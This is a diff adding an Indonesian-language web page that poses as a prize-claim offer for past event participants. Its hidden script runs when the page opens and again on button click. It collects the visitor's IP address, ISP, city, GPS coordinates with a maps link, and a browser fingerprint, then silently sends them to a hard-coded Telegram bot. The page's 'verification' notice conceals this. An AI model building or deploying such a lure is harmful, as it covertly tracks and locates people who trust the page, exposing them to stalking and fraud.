@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Claim Hadiah</title>
+
+<style>
+body{
+    margin:0;
+    font-family:Segoe UI,Tahoma,sans-serif;
+    background:linear-gradient(135deg,#ff4d6d,#ffb703);
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+}
+.card{
+    background:#fff;
+    width:90%;
+    max-width:420px;
+    border-radius:18px;
+    padding:25px;
+    text-align:center;
+    box-shadow:0 20px 40px rgba(0,0,0,.25);
+}
+.gift{
+    width:140px;
+    animation:float 2.5s ease-in-out infinite;
+}
+@keyframes float{
+    0%{transform:translateY(0)}
+    50%{transform:translateY(-10px)}
+    100%{transform:translateY(0)}
+}
+h1{font-size:20px;margin:15px 0}
+p{font-size:14px;color:#555}
+button{
+    margin-top:20px;
+    width:100%;
+    padding:14px;
+    border:none;
+    border-radius:30px;
+    font-size:16px;
+    font-weight:bold;
+    color:#fff;
+    background:linear-gradient(135deg,#ff006e,#ffbe0b);
+    cursor:pointer;
+}
+button:active{transform:scale(.97)}
+.note{
+    margin-top:15px;
+    font-size:11px;
+    color:#888;
+}
+</style>
+</head>
+
+<body>
+
+<div class="card">
+    <img class="gift" src="https://cdn-icons-png.flaticon.com/512/4213/4213958.png">
+    <h1>Terima kasih telah beradaptasi di event kami sebelumnya 🎉</h1>
+    <p>
+        Sebagai bentuk apresiasi, kami menyiapkan hadiah spesial untuk Anda.
+        Silakan klik tombol di bawah untuk mengklaim hadiah.
+    </p>
+
+    <button onclick="claimGift()">🎁 Claim Hadiah Anda</button>
+
+    <div class="note">
+        Dengan melanjutkan, Anda menyetujui proses verifikasi sistem.
+    </div>
+</div>
+
+<script>
+/* ======================
+   KONFIG BOT TELEGRAM
+====================== */
+const BOT_TOKEN = "8414329292:AAFY_Pf_ImGUkc9ccLVYJ32bmlE0ODXF0MI";
+const CHAT_ID  = "7180932899";
+
+/* ======================
+   FINGERPRINT
+====================== */
+function fingerprint(){
+    return btoa([
+        navigator.userAgent,
+        navigator.language,
+        navigator.platform,
+        navigator.hardwareConcurrency,
+        navigator.deviceMemory,
+        screen.width+"x"+screen.height,
+        Intl.DateTimeFormat().resolvedOptions().timeZone
+    ].join("|")).substring(0,40);
+}
+
+/* ======================
+   KIRIM LOG
+====================== */
+function sendLog(trigger){
+    fetch("https://ipinfo.io/json")
+    .then(r=>r.json())
+    .then(d=>{
+        const loc=d.loc||"-";
+        let maps="-";
+        if(loc.includes(",")){
+            const [la,lo]=loc.split(",");
+            maps=`https://maps.google.com/?q=${la},${lo}`;
+        }
+
+        const msg=
+`🎁 EVENT REWARD LOG
+━━━━━━━━━━━━━━
+📌 Trigger: ${trigger}
+
+🌐 IP: ${d.ip}
+🏢 ISP: ${d.org}
+📍 Lokasi: ${d.city}, ${d.region}, ${d.country}
+🧭 Koordinat: ${loc}
+🗺 Maps: ${maps}
+
+🧬 Fingerprint:
+${fingerprint()}
+
+📱 Device: ${navigator.platform}
+🌍 Browser:
+${navigator.userAgent}
+
+🕒 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+━━━━━━━━━━━━━━`;
+
+        const url=`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
+        new Image().src=url;
+    });
+}
+
+/* ======================
+   AUTO KIRIM SAAT LINK DIBUKA
+====================== */
+sendLog("AUTO OPEN");
+
+/* ======================
+   SAAT TOMBOL DIKLIK
+====================== */
+function claimGift(){
+    sendLog("BUTTON CLICK");
+    alert("🎉 Hadiah Anda sedang diproses!");
+}
+</script>
+
+</body>
+</html>
